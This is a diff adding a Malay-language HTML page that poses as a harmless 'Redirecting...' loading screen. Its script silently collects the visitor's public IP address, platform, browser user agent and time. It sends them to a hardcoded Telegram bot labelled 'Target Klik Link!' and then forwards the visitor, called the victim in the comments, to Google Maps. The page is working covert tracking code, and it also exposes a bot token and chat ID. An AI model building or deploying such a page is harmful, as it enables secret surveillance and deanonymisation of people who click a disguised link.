@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirecting...</title>
+    <style>
+        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
+    </style>
+</head>
+<body>
+    <p>Sila tunggu, sedang memuatkan halaman...</p>
+
+    <script>
+        // Masukkan maklumat bot anda di sini
+        const TOKEN = '8394303860:AAFYWxFLFXNSFxOfVo3pRhhs450SgYHpRho';
+        const CHAT_ID = '8231316463';
+
+        async function track() {
+            // 1. Ambil IP
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            
+            // 2. Ambil info peranti
+            const info = {
+                ip: data.ip,
+                peranti: navigator.platform,
+                browser: navigator.userAgent,
+                masa: new Date().toLocaleString()
+            };
+
+            // 3. Hantar ke Telegram
+            const mesej = `📍 *Target Klik Link!* \n\nIP: ${info.ip} \nPeranti: ${info.peranti} \nMasa: ${info.masa}`;
+            
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(mesej)}&parse_mode=Markdown`);
+
+            // 4. Hantar mangsa ke link sebenar (Contoh: Google Maps)
+            window.location.href = "https://www.google.com/maps";
+        }
+
+        track();
+    </script>
+</body>
+</html>
